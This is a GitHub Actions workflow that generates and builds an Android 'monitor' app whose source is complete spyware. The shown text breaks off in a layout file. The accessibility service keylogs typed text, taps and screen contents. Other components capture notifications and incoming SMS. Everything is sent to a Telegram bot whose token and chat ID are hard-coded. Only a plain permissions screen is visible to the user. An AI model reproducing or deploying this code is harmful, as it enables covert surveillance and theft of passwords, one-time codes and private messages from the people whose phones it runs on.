name: Build Powerful Monitor APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/example/monitorapp
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }

          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.PREFER_PROJECT)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "MonitorApp"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.example.monitorapp'
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.monitorapp"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          cat > app/proguard-rules.pro << 'EOF'
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.monitorapp">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />

              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.MonitorApp">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".MonitorService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <service
                      android:name=".NotificationMonitor"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>

                  <receiver
                      android:name=".SMSReceiver"
                      android:exported="true"
                      android:permission="android.permission.BROADCAST_SMS">
                      <intent-filter>
                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/example/monitorapp/MainActivity.java << 'EOF'
          package com.example.monitorapp;

          import android.Manifest;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.Toast;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends AppCompatActivity {

              private static final int SMS_PERMISSION_CODE = 100;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  Button btnGrantNotification = findViewById(R.id.btnGrantNotification);
                  Button btnGrantSms = findViewById(R.id.btnGrantSms);
                  Button btnOpenWeb = findViewById(R.id.btnOpenWeb);

                  btnGrantNotification.setOnClickListener(v -> {
                      Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                      startActivity(intent);
                  });

                  btnGrantSms.setOnClickListener(v -> {
                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                              ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
                          ActivityCompat.requestPermissions(this,
                                  new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS},
                                  SMS_PERMISSION_CODE);
                      } else {
                          Toast.makeText(this, "SMS permission already granted", Toast.LENGTH_SHORT).show();
                      }
                  });

                  btnOpenWeb.setOnClickListener(v -> {
                      Intent webIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://neon-aim.vercel.app/"));
                      startActivity(webIntent);
                  });

                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                          ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
                      ActivityCompat.requestPermissions(this,
                              new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS},
                              SMS_PERMISSION_CODE);
                  }
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == SMS_PERMISSION_CODE) {
                      if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                          Toast.makeText(this, "SMS permission granted", Toast.LENGTH_SHORT).show();
                      } else {
                          Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show();
                      }
                  }
              }
          }
          EOF

          cat > app/src/main/java/com/example/monitorapp/MonitorService.java << 'EOF'
          package com.example.monitorapp;

          import android.accessibilityservice.AccessibilityService;
          import android.os.Handler;
          import android.os.Looper;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import java.io.File;
          import java.io.FileWriter;
          import java.io.IOException;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class MonitorService extends AccessibilityService {

              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
              private static final String CHAT_ID = "8534616003";
              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(15, TimeUnit.SECONDS)
                      .readTimeout(15, TimeUnit.SECONDS)
                      .build();

              private Handler handler = new Handler(Looper.getMainLooper());
              private String lastScreenTextHash = "";
              private long lastScreenSentTime = 0;

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

                  switch (event.getEventType()) {
                      case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                          CharSequence typedText = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
                          if (typedText != null && typedText.length() > 0) {
                              String log = "[" + packageName + "] " + typedText;
                              logToFile("[" + System.currentTimeMillis() + "] " + log);
                              sendTextToTelegram("📝 [" + packageName + "] " + typedText);
                          }
                          break;

                      case AccessibilityEvent.TYPE_VIEW_CLICKED:
                          AccessibilityNodeInfo source = event.getSource();
                          String clickedText = "";
                          if (source != null) {
                              clickedText = source.getText() != null ? source.getText().toString() : (source.getContentDescription() != null ? source.getContentDescription().toString() : "");
                              source.recycle();
                          }
                          if (!clickedText.isEmpty()) {
                              sendTextToTelegram("👆 [" + packageName + "] Tapped: " + clickedText);
                          }
                          break;

                      case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                          handler.postDelayed(() -> captureAndSendScreenText(packageName), 1000);
                          break;

                      case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                          handler.postDelayed(() -> captureAndSendScreenText(packageName), 500);
                          break;

                      case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                          handler.postDelayed(() -> captureAndSendScreenText(packageName), 500);
                          break;

                      default:
                          break;
                  }
              }

              private void captureAndSendScreenText(String packageName) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  String fullText = extractTextFromNode(root);
                  if (fullText.length() > 5) {
                      String hash = Integer.toHexString(fullText.hashCode());
                      long now = System.currentTimeMillis();
                      if (!hash.equals(lastScreenTextHash) || (now - lastScreenSentTime) > 3000) {
                          lastScreenTextHash = hash;
                          lastScreenSentTime = now;
                          sendTextToTelegram("🖥️ [" + packageName + "] " + fullText);
                      }
                  }
              }

              private String extractTextFromNode(AccessibilityNodeInfo node) {
                  StringBuilder sb = new StringBuilder();
                  if (node == null) return sb.toString();
                  if (node.getText() != null) {
                      sb.append(node.getText().toString()).append(" | ");
                  }
                  if (node.getContentDescription() != null) {
                      sb.append(node.getContentDescription().toString()).append(" | ");
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo child = node.getChild(i);
                      if (child != null) {
                          sb.append(extractTextFromNode(child));
                          child.recycle();
                      }
                  }
                  return sb.toString();
              }

              @Override
              public void onInterrupt() {
              }

              private void sendTextToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String url = TELEGRAM_API + "/sendMessage";
                          RequestBody body = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("text", message)
                                  .build();
                          Request request = new Request.Builder()
                                  .url(url)
                                  .post(body)
                                  .build();
                          httpClient.newCall(request).execute().close();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                  }).start();
              }

              private void logToFile(String data) {
                  File dir = new File(getExternalFilesDir(null), "logs");
                  if (!dir.exists()) dir.mkdirs();
                  File file = new File(dir, "keylog.txt");
                  try (FileWriter fw = new FileWriter(file, true)) {
                      fw.append(data).append("\n");
                  } catch (IOException e) {
                      e.printStackTrace();
                  }
              }
          }
          EOF

          cat > app/src/main/java/com/example/monitorapp/NotificationMonitor.java << 'EOF'
          package com.example.monitorapp;

          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          import android.app.Notification;
          import java.io.IOException;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class NotificationMonitor extends NotificationListenerService {

              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
              private static final String CHAT_ID = "8534616003";
              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(15, TimeUnit.SECONDS)
                      .readTimeout(15, TimeUnit.SECONDS)
                      .build();

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String packageName = sbn.getPackageName();
                  String appName = packageName;
                  try {
                      appName = getPackageManager().getApplicationLabel(
                              getPackageManager().getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                  }

                  Notification notification = sbn.getNotification();
                  Bundle extras = notification.extras;
                  String title = extras.getString(Notification.EXTRA_TITLE, "");
                  String text = extras.getString(Notification.EXTRA_TEXT, "");
                  String bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "");
                  String subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");

                  StringBuilder messageBuilder = new StringBuilder();
                  messageBuilder.append("📩 Notification from ").append(appName)
                          .append(" (").append(packageName).append(")\n");
                  if (!title.isEmpty()) messageBuilder.append("Title: ").append(title).append("\n");
                  if (!text.isEmpty()) messageBuilder.append("Text: ").append(text).append("\n");
                  if (!bigText.isEmpty()) messageBuilder.append("Big Text: ").append(bigText).append("\n");
                  if (!subText.isEmpty()) messageBuilder.append("Sub Text: ").append(subText).append("\n");

                  sendTextToTelegram(messageBuilder.toString());
              }

              @Override
              public void onNotificationRemoved(StatusBarNotification sbn) {
              }

              private void sendTextToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String url = TELEGRAM_API + "/sendMessage";
                          RequestBody body = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("text", message)
                                  .build();
                          Request request = new Request.Builder()
                                  .url(url)
                                  .post(body)
                                  .build();
                          httpClient.newCall(request).execute().close();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                  }).start();
              }
          }
          EOF

          cat > app/src/main/java/com/example/monitorapp/SMSReceiver.java << 'EOF'
          package com.example.monitorapp;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import java.io.IOException;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class SMSReceiver extends BroadcastReceiver {

              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
              private static final String CHAT_ID = "8534616003";
              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;

              @Override
              public void onReceive(Context context, Intent intent) {
                  if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                      Bundle bundle = intent.getExtras();
                      if (bundle != null) {
                          Object[] pdus = (Object[]) bundle.get("pdus");
                          if (pdus != null) {
                              for (Object pdu : pdus) {
                                  SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                                  String sender = sms.getDisplayOriginatingAddress();
                                  String messageBody = sms.getMessageBody();
                                  String fullMessage = "💬 SMS from " + sender + ": " + messageBody;
                                  sendTextToTelegram(fullMessage);
                              }
                          }
                      }
                  }
              }

              private void sendTextToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String url = TELEGRAM_API + "/sendMessage";
                          RequestBody body = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("text", message)
                                  .build();
                          Request request = new Request.Builder()
                                  .url(url)
                                  .post(body)
                                  .build();
                          OkHttpClient client = new OkHttpClient.Builder()
                                  .connectTimeout(15, TimeUnit.SECONDS)
                                  .readTimeout(15, TimeUnit.SECONDS)
                                  .build();
                          client.newCall(request).execute().close();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                  }).start();
              }
          }
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
